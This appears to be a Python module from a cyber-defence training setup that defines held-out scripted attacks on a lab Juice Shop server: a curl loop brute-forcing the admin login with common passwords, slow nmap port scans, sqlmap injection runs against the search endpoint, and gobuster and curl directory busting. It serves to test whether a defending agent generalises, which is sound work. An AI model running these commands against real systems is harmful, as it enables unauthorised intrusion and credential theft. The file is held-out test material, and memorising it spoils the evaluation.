"""
Scripted attackers: the HELD-OUT test set. Blue never trains against these; they are only
used to measure whether what Blue learned against the LLM Red generalises to attacks it has
never seen. Each one is a list of shell steps run on the attacker box, one step per Red tick.

They are chosen to look different from the LLM Red's typical behaviour:
  - bruteforce_login: many failed logins, no SQL payload (no signature fires by default)
  - slow_scan:        low-and-slow port scan below the IDS scan threshold
  - sqlmap_search:    automated SQL injection tool, very noisy
  - dir_bust:         wordlist content discovery, lots of 404s
"""
JS = "http://10.10.2.11:3000"

_PASSWORDS = ["123456", "password", "admin", "admin123", "qwerty", "letmein", "welcome", "monkey",
              "dragon", "iloveyou", "princess", "sunshine", "football", "shadow", "master", "abc123"]


def _brute(i):
    pw = _PASSWORDS[(i * 4) % len(_PASSWORDS):(i * 4) % len(_PASSWORDS) + 4]
    loops = " ".join(pw)
    return (f"for p in {loops}; do curl -s -o /dev/null -w '%{{http_code}} ' -m 6 -X POST "
            f"-H 'Content-Type: application/json' -d \"{{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"password\\\":\\\"$p\\\"}}\" "
            f"{JS}/rest/user/login; done")


def steps(kind, n):
    if kind == "bruteforce_login":
        return [_brute(i) for i in range(n)]
    if kind == "slow_scan":
        ranges = ["20-25", "80-90", "440-445", "2999-3001", "4999-5001", "8000-8090", "3306,5432", "22,21,23"]
        out = []
        for i in range(n):
            host = "10.10.2.11" if i % 2 == 0 else "10.10.2.10"
            out.append(f"nmap -Pn -sT --scan-delay 400ms --max-retries 1 -p {ranges[i % len(ranges)]} {host}")
        return out
    if kind == "sqlmap_search":
        base = (f"sqlmap -u '{JS}/rest/products/search?q=apple' --batch --level 1 --risk 1 "
                f"--timeout 5 --retries 0 --threads 2 --flush-session")
        variants = ["", " --technique=B", " --technique=U", " --technique=T", " --dbs", " --tables"]
        return [base + variants[i % len(variants)] for i in range(n)]
    if kind == "dir_bust":
        return [f"gobuster dir -u {JS} -w $WORDLIST -q -t 10 --timeout 5s -s 200,301,302,401,403 -b '' "
                f"--exclude-length 0 2>&1 | head -n 25" if i == 0 else
                f"for w in $(shuf -n 25 $WORDLIST); do curl -s -o /dev/null -w '%{{http_code}} ' -m 4 {JS}/$w; done"
                for i in range(n)]
    raise ValueError(kind)


def reached(output):
    """Did this scripted step get answers from the target?"""
    o = output or ""
    if "timed out" in o or "000 000 000" in o or "host seems down" in o:
        return False
    return any(t in o for t in ("200", "401", "404", "/tcp", "parameter", "available databases", "Status:"))
